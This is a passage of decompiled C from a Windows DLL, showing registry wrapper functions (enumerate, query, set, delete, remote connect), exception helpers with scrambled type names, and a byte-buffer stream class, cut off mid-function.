_DWORD *__thiscall sub_10019B05(HKEY this, _DWORD *a2, int a3, DWORD dwIndex, char a5)
{
  HKEY v5; // edi
  DWORD v6; // ebx
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  WCHAR Name[256]; // [esp+Ch] [ebp-21Ch] BYREF
  struct _FILETIME ftLastWriteTime; // [esp+20Ch] [ebp-1Ch] BYREF
  DWORD cchName[2]; // [esp+214h] [ebp-14h] BYREF
  int v13; // [esp+224h] [ebp-4h]

  cchName[1] = 0;
  cchName[0] = 255;
  v5 = sub_10019736(this, a3, a5);
  v6 = RegEnumKeyExW(v5, dwIndex, Name, cchName, 0, 0, 0, &ftLastWriteTime);
  sub_1001984B(v5);
  SetLastError(v6);
  if ( v6 )
  {
    if ( v6 == 2 )
    {
      v8 = sub_100209F2(&a3);
      v13 = 1;
      sub_1001A92A((int)v8);
    }
    if ( v6 != 234 && v6 != 259 )
    {
      v7 = sub_100245AE(&a5);
      v13 = 2;
      sub_1001A8EA((int)v7);
    }
  }
  sub_1000D17D(a2, Name);
  return a2;
}

//----- (10019BD4) --------------------------------------------------------
DWORD __thiscall sub_10019BD4(HKEY this, int a2, char a3)
{
  HKEY v4; // eax
  DWORD v5; // edi
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  DWORD v8; // esi
  DWORD cSubKeys; // [esp+Ch] [ebp-24h] BYREF
  int v11; // [esp+10h] [ebp-20h] BYREF
  int v12; // [esp+14h] [ebp-1Ch] BYREF
  HKEY v13[3]; // [esp+18h] [ebp-18h] BYREF
  int v14; // [esp+2Ch] [ebp-4h]

  GetCurrentProcessId();
  GetCurrentProcessId();
  v4 = sub_10019736(this, a2, a3);
  sub_10011B1D(v13, (int)v4);
  v14 = 0;
  v5 = RegQueryInfoKeyA(v13[1], 0, 0, 0, &cSubKeys, 0, 0, 0, 0, 0, 0, 0);
  SetLastError(v5);
  if ( v5 )
  {
    if ( v5 != 2 )
    {
      v6 = sub_100245AE(&v11);
      LOBYTE(v14) = 2;
      sub_1001A8EA((int)v6);
    }
    v7 = sub_100209F2(&v12);
    LOBYTE(v14) = 1;
    sub_1001A90A((int)v7);
  }
  v8 = cSubKeys;
  v14 = -1;
  sub_10011DDD(v13);
  return v8;
}

//----- (10019CA4) --------------------------------------------------------
int __thiscall sub_10019CA4(HKEY this, int a2)
{
  HKEY v3; // eax
  DWORD v4; // edi
  _DWORD *v5; // eax
  int v6; // esi
  int v8; // [esp+Ch] [ebp-24h] BYREF
  struct _FILETIME ftLastWriteTime; // [esp+10h] [ebp-20h] BYREF
  HKEY v10[3]; // [esp+18h] [ebp-18h] BYREF
  int v11; // [esp+2Ch] [ebp-4h]

  GetCurrentProcessId();
  GetCurrentProcessId();
  v3 = sub_10019736(this, a2, 1);
  sub_10011B1D(v10, (int)v3);
  v11 = 0;
  v4 = RegQueryInfoKeyA(v10[1], 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, &ftLastWriteTime);
  SetLastError(v4);
  if ( v4 )
  {
    v5 = sub_100245AE(&v8);
    LOBYTE(v11) = 1;
    sub_1001A8EA((int)v5);
  }
  v6 = *(__int64 *)&ftLastWriteTime / 10000 / 1000 + 1240428288;
  v11 = -1;
  sub_10011DDD(v10);
  return v6;
}

//----- (10019D77) --------------------------------------------------------
_DWORD *__thiscall sub_10019D77(HKEY this, _DWORD *a2, LSTATUS a3)
{
  HKEY v4; // eax
  _DWORD *v5; // eax
  DWORD v6; // edi
  int v8; // [esp+Ch] [ebp-28h] BYREF
  HKEY hKey; // [esp+10h] [ebp-24h]
  int v10[2]; // [esp+14h] [ebp-20h] BYREF
  int v11; // [esp+1Ch] [ebp-18h]
  DWORD cchClass; // [esp+20h] [ebp-14h] BYREF
  WCHAR Class; // [esp+24h] [ebp-10h] BYREF
  int v14; // [esp+30h] [ebp-4h]

  v11 = 0;
  GetCurrentProcessId();
  GetCurrentProcessId();
  v4 = sub_10019736(this, a3, 1);
  sub_10011B1D(&v8, (int)v4);
  v14 = 1;
  cchClass = 1;
  a3 = RegQueryInfoKeyW(hKey, &Class, &cchClass, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  SetLastError(a3);
  if ( a3 )
  {
    if ( a3 != 122 )
    {
      v5 = sub_100245AE(&a3);
      LOBYTE(v14) = 2;
      goto LABEL_4;
    }
    sub_1000D1D6(v10, cchClass);
    LOBYTE(v14) = 3;
    ++cchClass;
    sub_1000D4A1(v10);
    v6 = RegQueryInfoKeyW(hKey, *(LPWSTR *)(v10[1] + 12), &cchClass, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    sub_1000D6AC((int)v10);
    SetLastError(v6);
    if ( v6 )
    {
      v5 = sub_100245AE(&a3);
      LOBYTE(v14) = 4;
LABEL_4:
      sub_1001A8EA((int)v5);
    }
    sub_1000D372(a2, (int)v10);
    v11 = 1;
    LOBYTE(v14) = 1;
    sub_1000D3AD(v10);
  }
  else
  {
    sub_1000D17D(a2, &word_10179CB4);
    v11 = 1;
  }
  LOBYTE(v14) = 0;
  sub_10011DDD(&v8);
  return a2;
}

//----- (10019EAF) --------------------------------------------------------
char __thiscall sub_10019EAF(HKEY this, int a2, int a3, int a4)
{
  HKEY v6; // eax
  DWORD v7; // edi
  _DWORD *v8; // eax
  DWORD cbData; // [esp+Ch] [ebp-24h] BYREF
  DWORD Type; // [esp+10h] [ebp-20h] BYREF
  int v11; // [esp+14h] [ebp-1Ch] BYREF
  HKEY v12[3]; // [esp+18h] [ebp-18h] BYREF
  int v13; // [esp+2Ch] [ebp-4h]

  if ( !(*(unsigned __int8 (__thiscall **)(HKEY, int, int))(*(_DWORD *)this + 4))(this, a2, a4) )
    return 0;
  GetCurrentProcessId();
  GetCurrentProcessId();
  v6 = sub_10019736(this, a2, a4);
  sub_10011B1D(v12, (int)v6);
  v13 = 0;
  v7 = RegQueryValueExW(v12[1], *(LPCWSTR *)(*(_DWORD *)(a3 + 4) + 12), 0, &Type, 0, &cbData);
  SetLastError(v7);
  if ( v7 )
  {
    if ( v7 != 2 )
    {
      v8 = sub_100245AE(&v11);
      LOBYTE(v13) = 1;
      sub_1001A8EA((int)v8);
    }
    v13 = -1;
    sub_10011DDD(v12);
    return 0;
  }
  v13 = -1;
  sub_10011DDD(v12);
  return 1;
}

//----- (10019F8F) --------------------------------------------------------
_DWORD *__thiscall sub_10019F8F(HKEY this, _DWORD *a2, int a3, int a4, DWORD *a5, LSTATUS a6)
{
  HKEY v7; // eax
  _DWORD *v8; // eax
  _DWORD *v9; // eax
  const WCHAR *v10; // ebx
  int v11; // ecx
  BYTE *v12; // eax
  DWORD v13; // esi
  int v15; // [esp+Ch] [ebp-20h] BYREF
  HKEY hKey; // [esp+10h] [ebp-1Ch]
  int v17; // [esp+14h] [ebp-18h]
  DWORD Type; // [esp+18h] [ebp-14h] BYREF
  DWORD cbData; // [esp+1Ch] [ebp-10h] BYREF
  int v20; // [esp+28h] [ebp-4h]

  v20 = 0;
  v17 = 0;
  GetCurrentProcessId();
  GetCurrentProcessId();
  v7 = sub_10019736(this, a3, a6);
  sub_10011B1D(&v15, (int)v7);
  v20 = 1;
  a6 = RegQueryValueExW(hKey, *(LPCWSTR *)(*(_DWORD *)(a4 + 4) + 12), 0, &Type, 0, &cbData);
  SetLastError(a6);
  if ( a6 )
  {
    if ( a6 != 2 )
    {
      v8 = sub_100245AE(&a4);
      LOBYTE(v20) = 3;
      goto LABEL_4;
    }
    v9 = sub_100209F2(&a6);
    LOBYTE(v20) = 2;
    goto LABEL_6;
  }
  sub_1000B1F3((void *)cbData, (int)a2, 0);
  v10 = *(const WCHAR **)(*(_DWORD *)(a4 + 4) + 12);
  v17 = 1;
  v12 = (BYTE *)sub_1000B49B(a2, v11);
  v13 = RegQueryValueExW(hKey, v10, 0, &Type, v12, &cbData);
  *(_BYTE *)(a2[1] + 8) = 1;
  SetLastError(v13);
  if ( v13 )
  {
    if ( v13 != 2 )
    {
      v8 = sub_100245AE(&a4);
      LOBYTE(v20) = 5;
LABEL_4:
      sub_1001A8EA((int)v8);
    }
    v9 = sub_100209F2(&a6);
    LOBYTE(v20) = 4;
LABEL_6:
    sub_1001A92A((int)v9);
  }
  *a5 = Type;
  LOBYTE(v20) = 0;
  sub_10011DDD(&v15);
  return a2;
}
// 1001A059: variable 'v11' is possibly undefined

//----- (1001A0D2) --------------------------------------------------------
char __thiscall sub_1001A0D2(HKEY this, int a2, int a3, _DWORD *a4, DWORD dwType)
{
  HKEY v6; // eax
  const WCHAR *v7; // esi
  const BYTE *v8; // eax
  DWORD v9; // esi
  _DWORD *v10; // eax
  DWORD v12; // [esp-4h] [ebp-2Ch]
  int v13; // [esp+Ch] [ebp-1Ch] BYREF
  HKEY v14[3]; // [esp+10h] [ebp-18h] BYREF
  int v15; // [esp+24h] [ebp-4h]

  GetCurrentProcessId();
  GetCurrentProcessId();
  v6 = sub_10019736(this, a2, 0);
  sub_10011B1D(v14, (int)v6);
  v15 = 0;
  v7 = *(const WCHAR **)(*(_DWORD *)(a3 + 4) + 12);
  v12 = a4[3];
  v8 = (const BYTE *)sub_1000B4B8(a4);
  v9 = RegSetValueExW(v14[1], v7, 0, dwType, v8, v12);
  SetLastError(v9);
  if ( v9 )
  {
    v10 = sub_100245AE(&v13);
    LOBYTE(v15) = 1;
    sub_1001A8EA((int)v10);
  }
  v15 = -1;
  return sub_10011DDD(v14);
}

//----- (1001A187) --------------------------------------------------------
char __thiscall sub_1001A187(HKEY this, int a2, int a3)
{
  HKEY v4; // eax
  DWORD v5; // esi
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  int v9; // [esp+8h] [ebp-28h] BYREF
  int v10; // [esp+Ch] [ebp-24h] BYREF
  int v11[2]; // [esp+10h] [ebp-20h] BYREF
  HKEY v12[3]; // [esp+18h] [ebp-18h] BYREF
  int v13; // [esp+2Ch] [ebp-4h]

  GetCurrentProcessId();
  GetCurrentProcessId();
  v4 = sub_10019736(this, a2, 0);
  sub_10011B1D(v12, (int)v4);
  v13 = 0;
  sub_1000D372(v11, a3);
  LOBYTE(v13) = 1;
  v5 = RegDeleteValueW(v12[1], *(LPCWSTR *)(v11[1] + 12));
  SetLastError(v5);
  if ( v5 )
  {
    if ( v5 != 2 )
    {
      v6 = sub_100245AE(&v9);
      LOBYTE(v13) = 3;
      sub_1001A8EA((int)v6);
    }
    v7 = sub_100209F2(&v10);
    LOBYTE(v13) = 2;
    sub_1001A92A((int)v7);
  }
  LOBYTE(v13) = 0;
  sub_1000D3AD(v11);
  v13 = -1;
  return sub_10011DDD(v12);
}

//----- (1001A268) --------------------------------------------------------
_DWORD *__thiscall sub_1001A268(HKEY this, _DWORD *a2, int a3, DWORD dwIndex, char a5)
{
  HKEY v6; // eax
  DWORD v7; // edi
  _DWORD *v8; // eax
  _DWORD *v9; // eax
  WCHAR ValueName[256]; // [esp+Ch] [ebp-21Ch] BYREF
  HKEY v12[2]; // [esp+20Ch] [ebp-1Ch] BYREF
  DWORD cchValueName; // [esp+214h] [ebp-14h] BYREF
  int v14; // [esp+218h] [ebp-10h]
  int v15; // [esp+224h] [ebp-4h]

  v14 = 0;
  cchValueName = 255;
  GetCurrentProcessId();
  GetCurrentProcessId();
  v6 = sub_10019736(this, a3, a5);
  sub_10011B1D(v12, (int)v6);
  v15 = 1;
  v7 = RegEnumValueW(v12[1], dwIndex, ValueName, &cchValueName, 0, 0, 0, 0);
  SetLastError(v7);
  if ( v7 )
  {
    if ( v7 == 2 )
    {
      v9 = sub_100209F2(&a3);
      LOBYTE(v15) = 2;
      sub_1001A92A((int)v9);
    }
    if ( v7 != 234 && v7 != 259 )
    {
      v8 = sub_100245AE(&a5);
      LOBYTE(v15) = 3;
      sub_1001A8EA((int)v8);
    }
  }
  sub_1000D17D(a2, ValueName);
  v14 = 1;
  LOBYTE(v15) = 0;
  sub_10011DDD(v12);
  return a2;
}

//----- (1001A34A) --------------------------------------------------------
DWORD __thiscall sub_1001A34A(HKEY this, int a2, char a3)
{
  HKEY v4; // eax
  DWORD v5; // edi
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  DWORD v8; // esi
  DWORD cValues; // [esp+8h] [ebp-20h] BYREF
  int v11; // [esp+Ch] [ebp-1Ch] BYREF
  HKEY v12[3]; // [esp+10h] [ebp-18h] BYREF
  int v13; // [esp+24h] [ebp-4h]

  GetCurrentProcessId();
  GetCurrentProcessId();
  v4 = sub_10019736(this, a2, a3);
  sub_10011B1D(v12, (int)v4);
  v13 = 0;
  v5 = RegQueryInfoKeyA(v12[1], 0, 0, 0, 0, 0, 0, &cValues, 0, 0, 0, 0);
  SetLastError(v5);
  if ( v5 )
  {
    if ( v5 != 2 )
    {
      v6 = sub_100245AE(&v11);
      LOBYTE(v13) = 2;
      sub_1001A8EA((int)v6);
    }
    v7 = sub_100209F2(&v11);
    LOBYTE(v13) = 1;
    sub_1001A90A((int)v7);
  }
  v8 = cValues;
  v13 = -1;
  sub_10011DDD(v12);
  return v8;
}

//----- (1001A415) --------------------------------------------------------
int __thiscall sub_1001A415(void *this, int a2, HKEY phkResult, char a4)
{
  REGSAM v6; // eax
  DWORD v7; // esi
  _DWORD *v8; // eax
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  int v11; // [esp+Ch] [ebp-10h] BYREF
  int v12; // [esp+18h] [ebp-4h]

  if ( !sub_1000D65C((int)&unk_10186950, (int)this) )
    return -2147483646;
  if ( !sub_1000D65C((int)&unk_10186948, (int)this) )
    return 0x80000000;
  if ( !sub_1000D65C((int)&unk_10186928, (int)this) )
    return -2147483645;
  if ( !sub_1000D65C((int)&unk_10186938, (int)this) )
    return -2147483643;
  if ( (_BYTE)phkResult )
    goto LABEL_24;
  if ( !sub_1000D65C((int)&unk_10186940, (int)this) )
    return -2147483647;
  if ( sub_1000D65C((int)&unk_10186930, (int)this) )
  {
LABEL_24:
    v10 = sub_100209F2(&phkResult);
    v12 = 3;
    goto LABEL_22;
  }
  phkResult = 0;
  if ( a4 )
    v6 = 131097;
  else
    v6 = *(_DWORD *)(a2 + 4);
  v7 = RegOpenCurrentUser(v6, &phkResult);
  SetLastError(v7);
  if ( v7 )
  {
    if ( v7 != 2 )
    {
      if ( v7 != 5 )
      {
        v8 = sub_100245AE(&a4);
        v12 = 2;
        sub_1001A8EA((int)v8);
      }
      v9 = sub_100209F2(&a2);
      v12 = 0;
      sub_1001A8CA((int)v9);
    }
    v10 = sub_100209F2(&v11);
    v12 = 1;
LABEL_22:
    sub_1001A90A((int)v10);
  }
  return (int)phkResult;
}

//----- (1001A566) --------------------------------------------------------
HKEY __thiscall sub_1001A566(void *this, HKEY phkResult, int a3)
{
  HKEY v3; // eax
  int v4; // ecx
  DWORD v5; // eax
  _DWORD *v6; // eax

  v3 = (HKEY)sub_1001A415(this, (int)phkResult, (HKEY)1, 0);
  v4 = *(_DWORD *)(a3 + 4);
  phkResult = 0;
  v5 = RegConnectRegistryW(*(LPCWSTR *)(v4 + 12), v3, &phkResult);
  if ( v5 )
  {
    SetLastError(v5);
    v6 = sub_100245AE(&a3);
    sub_1001A8EA((int)v6);
  }
  return phkResult;
}

//----- (1001A5CA) --------------------------------------------------------
HKEY __stdcall sub_1001A5CA(HKEY phkResult, int a2, char a3)
{
  int v3; // edx
  int v4; // edx
  _DWORD *v5; // esi
  _DWORD *v6; // eax
  int v7; // edx
  HKEY v8; // esi
  int v10[20]; // [esp+4h] [ebp-A0h] BYREF
  int v11[2]; // [esp+54h] [ebp-50h] BYREF
  int v12[2]; // [esp+5Ch] [ebp-48h] BYREF
  int v13[7]; // [esp+64h] [ebp-40h] BYREF
  int v14[2]; // [esp+80h] [ebp-24h] BYREF
  int v15[2]; // [esp+88h] [ebp-1Ch] BYREF
  int v16[2]; // [esp+90h] [ebp-14h] BYREF
  int v17; // [esp+A0h] [ebp-4h]

  sub_10020BBA(v10, a2, (int)&unk_10186980);
  v17 = 0;
  sub_10020CA0(v10, v13);
  LOBYTE(v17) = 1;
  sub_10020DE6(v13, v16);
  LOBYTE(v17) = 2;
  if ( sub_1000D687((int)v16) )
  {
    v8 = (HKEY)sub_1001A415(v16, (int)phkResult, 0, a3);
  }
  else
  {
    sub_10020DC5(v13, v3);
    sub_10020DC5(v13, v4);
    v5 = sub_10020DE6(v13, v11);
    LOBYTE(v17) = 3;
    v6 = sub_1000D17D(v12, asc_10179CB8);
    LOBYTE(v17) = 4;
    sub_1000D5FF(v14, (int)v6, v5);
    LOBYTE(v17) = 6;
    sub_1000D3AD(v12);
    LOBYTE(v17) = 7;
    sub_1000D3AD(v11);
    sub_10020DC5(v13, v7);
    sub_10020DE6(v13, v15);
    LOBYTE(v17) = 8;
    v8 = sub_1001A566(v15, phkResult, (int)v14);
    LOBYTE(v17) = 7;
    sub_1000D3AD(v15);
    LOBYTE(v17) = 2;
    sub_1000D3AD(v14);
  }
  LOBYTE(v17) = 1;
  sub_1000D3AD(v16);
  LOBYTE(v17) = 0;
  sub_100511C9(v13);
  v17 = -1;
  sub_10020C49(v10);
  return v8;
}
// 1001A629: variable 'v3' is possibly undefined
// 1001A631: variable 'v4' is possibly undefined
// 1001A683: variable 'v7' is possibly undefined
// 1001A5CA: using guessed type int var_A0[20];
// 1001A5CA: using guessed type int var_40[7];

//----- (1001A70D) --------------------------------------------------------
_DWORD *__stdcall sub_1001A70D(_DWORD *a1, int a2)
{
  _DWORD *v2; // eax
  bool v3; // bl
  int v4; // edx
  int v5; // edx
  int v6; // edx
  _DWORD *v7; // eax
  bool v8; // bl
  int v9; // edx
  _DWORD *i; // eax
  _DWORD *v11; // eax
  int v12; // edx
  bool v13; // bl
  int v15[20]; // [esp+Ch] [ebp-ACh] BYREF
  int v16[7]; // [esp+5Ch] [ebp-5Ch] BYREF
  int v17[2]; // [esp+78h] [ebp-40h] BYREF
  int v18[7]; // [esp+80h] [ebp-38h] BYREF
  int v19[2]; // [esp+9Ch] [ebp-1Ch] BYREF
  int v20; // [esp+A4h] [ebp-14h]
  int v21; // [esp+B4h] [ebp-4h]

  v20 = 0;
  sub_10020BBA(v15, a2, (int)dword_10186980);
  v21 = 1;
  sub_10020CA0(v15, v18);
  LOBYTE(v21) = 2;
  v2 = sub_10020DE6(v18, v17);
  LOBYTE(v21) = 3;
  v3 = sub_1000D687((int)v2) == 0;
  LOBYTE(v21) = 2;
  sub_1000D3AD(v17);
  if ( v3 )
  {
    sub_10020DC5(v18, v4);
    sub_10020DC5(v18, v5);
    sub_10020DC5(v18, v6);
  }
  sub_10020DC5(v18, v4);
  v7 = sub_10020CDA(v15, v16);
  LOBYTE(v21) = 4;
  v8 = sub_10020EC4((int)v18, (int)v7);
  LOBYTE(v21) = 2;
  sub_100511C9(v16);
  if ( v8 )
  {
    sub_1000D17D(a1, &word_10179CC0);
    v20 = 1;
  }
  else
  {
    sub_10020DE6(v18, v19);
    LOBYTE(v21) = 5;
    sub_10020DC5(v18, v9);
    for ( i = sub_10020CDA(v15, v16); ; i = sub_10020CDA(v15, v16) )
    {
      LOBYTE(v21) = 6;
      v13 = !sub_10020EC4((int)v18, (int)i);
      LOBYTE(v21) = 5;
      sub_100511C9(v16);
      if ( !v13 )
        break;
      sub_1000D575((int)v19, dword_10186980);
      v11 = sub_10020DE6(v18, v17);
      LOBYTE(v21) = 7;
      sub_1000D575((int)v19, v11);
      LOBYTE(v21) = 5;
      sub_1000D3AD(v17);
      sub_10020DC5(v18, v12);
    }
    sub_1000D372(a1, (int)v19);
    v20 = 1;
    LOBYTE(v21) = 2;
    sub_1000D3AD(v19);
  }
  LOBYTE(v21) = 1;
  sub_100511C9(v18);
  LOBYTE(v21) = 0;
  sub_10020C49(v15);
  return a1;
}
// 1001A782: variable 'v4' is possibly undefined
// 1001A78A: variable 'v5' is possibly undefined
// 1001A792: variable 'v6' is possibly undefined
// 1001A7FA: variable 'v9' is possibly undefined
// 1001A842: variable 'v12' is possibly undefined
// 10186980: using guessed type _DWORD dword_10186980[2];
// 1001A70D: using guessed type int var_AC[20];
// 1001A70D: using guessed type int var_38[7];
// 1001A70D: using guessed type int var_5C[7];

//----- (1001A8CA) --------------------------------------------------------
void __cdecl __noreturn sub_1001A8CA(int pExceptionObject)
{
  sub_1001E589(&pExceptionObject, pExceptionObject);
  _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVTohkuixgRflZavycpWtohkuIxgrflzav_qsbdzsml_sr__);
}

//----- (1001A8EA) --------------------------------------------------------
void __cdecl __noreturn sub_1001A8EA(int pExceptionObject)
{
  sub_1000EE19(&pExceptionObject, pExceptionObject);
  _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
}

//----- (1001A90A) --------------------------------------------------------
void __cdecl __noreturn sub_1001A90A(int pExceptionObject)
{
  sub_1001E589(&pExceptionObject, pExceptionObject);
  _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVGvwHrhkGkbWwpxiPqhcwgvwh_qsbdzsml_sr__);
}

//----- (1001A92A) --------------------------------------------------------
void __cdecl __noreturn sub_1001A92A(int pExceptionObject)
{
  sub_1001E589(&pExceptionObject, pExceptionObject);
  _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVRcclrLlnuKrzOsvviGrcclrlln_qsbdzsml_sr__);
}

//----- (1001A94A) --------------------------------------------------------
_DWORD *__thiscall sub_1001A94A(_DWORD *Block, char a2)
{
  sub_100209C9(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001A969) --------------------------------------------------------
_DWORD *__thiscall sub_1001A969(void *this, _DWORD *a2, char a3)
{
  sub_1002033C(this, (int)a2, a3);
  *a2 = &off_10102A70;
  sub_1000B1F3((void *)8, (int)(a2 + 4), 0);
  return a2;
}
// 10102A70: using guessed type int (__thiscall *off_10102A70)(void *Block, char);

//----- (1001A9AF) --------------------------------------------------------
void *__thiscall sub_1001A9AF(void *Block, char a2)
{
  sub_1001A9CE((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001A9CE) --------------------------------------------------------
int __thiscall sub_1001A9CE(int this)
{
  _DWORD v3[5]; // [esp+0h] [ebp-20h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  v3[4] = v3;
  v3[3] = this;
  *(_DWORD *)this = &off_10102A70;
  v4 = 2;
  sub_100203B7((_BYTE *)this);
  v4 = 0;
  sub_1000B3DF((int *)(this + 16));
  v4 = -1;
  return sub_1002036C((_BYTE *)this);
}
// 10102A70: using guessed type int (__thiscall *off_10102A70)(void *Block, char);

//----- (1001AA35) --------------------------------------------------------
void *__thiscall sub_1001AA35(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 16))(this, a2);
  return this;
}

//----- (1001AA4A) --------------------------------------------------------
_DWORD *__thiscall sub_1001AA4A(_DWORD *this, char a2)
{
  _DWORD *v2; // esi
  int v3; // eax

  v2 = this;
  v3 = *this;
  LOBYTE(this) = a2 != 0;
  (*(void (__thiscall **)(_DWORD *, _DWORD *))(v3 + 16))(v2, this);
  return v2;
}

//----- (1001AA66) --------------------------------------------------------
void *__thiscall sub_1001AA66(void *this, char a2)
{
  (*(void (__thiscall **)(void *, char *, int))(*(_DWORD *)this + 84))(this, &a2, 2);
  return this;
}

//----- (1001AA80) --------------------------------------------------------
void *__thiscall sub_1001AA80(void *this, char a2)
{
  (*(void (__thiscall **)(void *, char *, int))(*(_DWORD *)this + 84))(this, &a2, 4);
  return this;
}

//----- (1001AA9A) --------------------------------------------------------
void *__thiscall sub_1001AA9A(void *this, char a2, int a3)
{
  (*(void (__thiscall **)(void *, char *, int))(*(_DWORD *)this + 84))(this, &a2, 8);
  return this;
}

//----- (1001AAB4) --------------------------------------------------------
void *__thiscall sub_1001AAB4(void *this, int a2, int a3)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 60))(this, 2 * *(_DWORD *)(a3 + 28) + 4);
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 60))(this, 0xFFFF);
  (*(void (__thiscall **)(void *, _DWORD, int))(*(_DWORD *)this + 84))(
    this,
    *(_DWORD *)(a3 + 12),
    2 * *(_DWORD *)(a3 + 28));
  sub_1000D3AD(&a2);
  return this;
}

//----- (1001AB12) --------------------------------------------------------
void *__thiscall sub_1001AB12(void *this, int a2, int a3, int a4, int a5, int a6)
{
  int v7; // eax

  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 60))(this, a5);
  v7 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)v7 + 12))(v7, &a2);
  sub_1000B3DF(&a2);
  return this;
}

//----- (1001AB5A) --------------------------------------------------------
void __thiscall sub_1001AB5A(_DWORD *this, unsigned __int8 *Source, rsize_t SourceSize)
{
  int v4; // esi
  int v5; // eax
  _DWORD *v6; // edi
  void *v7; // eax
  int v8; // esi
  int v9; // eax
  rsize_t v10; // [esp-10h] [ebp-38h]
  int v11[5]; // [esp+8h] [ebp-20h] BYREF
  int v12; // [esp+24h] [ebp-4h]

  if ( SourceSize == 1 )
  {
    (*(void (__thiscall **)(_DWORD *, _DWORD))(*this + 16))(this, *Source);
  }
  else
  {
    if ( SourceSize <= 8 )
    {
      v6 = this + 4;
      v10 = this[7];
      v7 = (void *)sub_1000B49B(this + 4, (int)this);
      memcpy_s(v7, v10, Source, SourceSize);
      *(_BYTE *)(this[5] + 8) = 1;
      v8 = (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
      v9 = sub_1000B67C(v6, (int)v11, 0, SourceSize);
      v12 = 1;
      (*(void (__thiscall **)(int, int))(*(_DWORD *)v8 + 12))(v8, v9);
    }
    else
    {
      v4 = (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
      v5 = sub_1000B1F3((void *)SourceSize, (int)v11, Source);
      v12 = 0;
      (*(void (__thiscall **)(int, int))(*(_DWORD *)v4 + 12))(v4, v5);
    }
    v12 = -1;
    sub_1000B3DF(v11);
  }
}
// 1001AB5A: using guessed type int var_20[5];

//----- (1001AC1E) --------------------------------------------------------
int __stdcall sub_1001AC1E(int a1)
{
  *(_BYTE *)(a1 + 4) = 0;
  *(_DWORD *)a1 = &off_10102AC8;
  sub_1000B1F3((void *)2, a1 + 8, 0);
  *(_DWORD *)(a1 + 28) = 0;
  *(_DWORD *)(a1 + 32) = 0;
  return a1;
}
// 10102AC8: using guessed type int (__thiscall *off_10102AC8)(void *Block, char);

//----- (1001AC6A) --------------------------------------------------------
void *__thiscall sub_1001AC6A(void *Block, char a2)
{
  sub_1001AC89((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001AC89) --------------------------------------------------------
int __thiscall sub_1001AC89(int this)
{
  _DWORD v3[5]; // [esp+0h] [ebp-20h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  v3[4] = v3;
  v3[3] = this;
  *(_DWORD *)this = &off_10102AC8;
  v4 = 2;
  sub_1001B4C9((_BYTE *)this);
  v4 = 0;
  sub_1000B3DF((int *)(this + 8));
  v4 = -1;
  return sub_1001B492((_BYTE *)this);
}
// 10102AC8: using guessed type int (__thiscall *off_10102AC8)(void *Block, char);

//----- (1001ACF0) --------------------------------------------------------
unsigned int __thiscall sub_1001ACF0(_DWORD *this, char a2)
{
  unsigned int result; // eax

  if ( this[8] == this[7] )
    (*(void (__thiscall **)(_DWORD *, int))(*this + 40))(this, 1);
  *(_BYTE *)sub_1000B4CB((int)(this + 2), (int)this, this[8]) = a2;
  result = ++this[8];
  if ( result > this[7] )
    this[7] = result;
  return result;
}
// 1001AD0B: variable 'this' is possibly undefined

//----- (1001AD28) --------------------------------------------------------
int __thiscall sub_1001AD28(_DWORD *this, _DWORD *a2)
{
  unsigned int v3; // edi
  unsigned int v4; // eax
  int v5; // ecx
  int v6; // eax
  int result; // eax
  bool v8; // cc
  const void *v9; // [esp-8h] [ebp-14h]
  size_t v10; // [esp-4h] [ebp-10h]

  v3 = this[8] + a2[3];
  v4 = this[7];
  if ( v3 > v4 )
    (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 40))(this, v3 - v4);
  v10 = a2[3];
  v9 = (const void *)sub_1000B4B8(a2);
  v6 = sub_1000B49B(this + 2, v5);
  memcpy((void *)(this[8] + v6), v9, v10);
  result = this[3];
  *(_BYTE *)(result + 8) = 1;
  v8 = v3 <= this[7];
  this[8] = v3;
  if ( !v8 )
    this[7] = v3;
  return result;
}
// 1001AD5A: variable 'v5' is possibly undefined

//----- (1001AD84) --------------------------------------------------------
int __thiscall sub_1001AD84(_DWORD *this, int a2)
{
  sub_1000B67C(this + 2, a2, 0, this[7]);
  return a2;
}

//----- (1001ADC1) --------------------------------------------------------
int __thiscall sub_1001ADC1(_DWORD *this, int a2, int a3)
{
  int v3; // eax
  int result; // eax
  int v5; // eax
  char v6[8]; // [esp+0h] [ebp-14h] BYREF
  int v7; // [esp+10h] [ebp-4h]

  v3 = 0;
  if ( a3 )
  {
    if ( a3 == 1 )
    {
      v3 = this[8];
    }
    else if ( a3 == 2 )
    {
      v3 = this[7];
    }
  }
  else
  {
    v3 = 0;
  }
  result = a2 + v3;
  if ( result < 0 || result > this[7] )
  {
    v5 = sub_1000E88D((int)v6, 1, 0);
    v7 = 0;
    sub_10012582(v5, 86);
  }
  this[8] = result;
  return result;
}
// 1001ADC1: using guessed type char var_14[8];

//----- (1001AE21) --------------------------------------------------------
unsigned int __thiscall sub_1001AE21(_DWORD *this, int a2)
{
  unsigned int v2; // edx
  unsigned int result; // eax

  v2 = this[7] + a2;
  result = this[5];
  if ( v2 > result )
  {
    do
      result *= 2;
    while ( v2 > result );
